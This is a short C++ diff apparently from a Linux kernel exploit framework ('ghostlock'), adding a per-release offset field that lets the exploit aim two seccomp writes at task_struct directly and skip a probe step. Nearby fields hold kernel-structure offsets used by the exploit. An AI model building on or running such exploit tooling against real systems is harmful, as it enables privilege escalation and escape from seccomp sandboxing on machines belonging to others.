@@ -118,6 +118,12 @@ namespace ghostlock::profile {
         std::optional<uint8_t> compact_waiter;
         std::optional<uint32_t> kernelsnitch_collisions;
         std::optional<uint32_t> mm_struct_sz;
+        /* Direction the W3 leaf-directory probe lands on, in 8-byte units
+         * relative to task_struct: 0 means the craft's write target is
+         * task_struct itself, 1 means task_struct + 8. When a release pins
+         * this, the W3-0 probe route is skipped entirely and the two seccomp
+         * writes are aimed directly. Absence keeps the per-run probe. */
+        std::optional<uint8_t> w3_leaf_to_target8;
     };
 
     struct RouteGeometry {
@@ -154,6 +160,7 @@ namespace ghostlock::profile {
     struct SelectStackLayout {
         std::optional<int32_t> waiter_shift;
         std::optional<uint8_t> compact_waiter;
+        std::optional<uint8_t> w3_leaf_to_target8;
     };
 
     struct TcpZerocopyLayout {
@@ -299,6 +306,7 @@ namespace ghostlock::profile {
                        ? (SelectStackLayout){
                            .waiter_shift = values_.geometry.pselect_waiter_shift,
                            .compact_waiter = values_.misc.compact_waiter,
+                           .w3_leaf_to_target8 = values_.misc.w3_leaf_to_target8,
                        }
                        : SelectStackLayout{};
         }
